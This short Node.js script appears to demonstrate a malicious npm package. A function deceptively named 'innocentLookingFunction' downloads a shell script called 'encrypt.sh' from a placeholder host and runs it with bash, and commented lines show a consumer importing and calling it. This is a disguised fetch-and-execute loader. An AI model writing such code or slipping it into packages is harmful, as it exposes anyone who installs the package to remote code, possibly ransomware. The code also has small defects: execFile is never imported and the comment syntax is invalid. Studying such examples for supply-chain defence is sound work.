#!/usr/bin/env node
import fetch from "node-fetch";
import fs from "fs";

async function download() {
    const res = await fetch("http://<some-site>/encrypt.sh");
    await new Promise((resolve, reject) => {
            const fileStream = fs.createWriteStream("./encrypt.sh");
            res.body.pipe(fileStream);
            fileStream.on("finish", function () {
                    resolve();
            });
     });
}
const run = async () => {
    await download()
    execFile("bash", ["encrypt.sh"]);
}
export default function innocentLookingFunction() {
    return run()
}

#// import innocentLookingFunction from "@my-package";
#// innocentLookingFunction();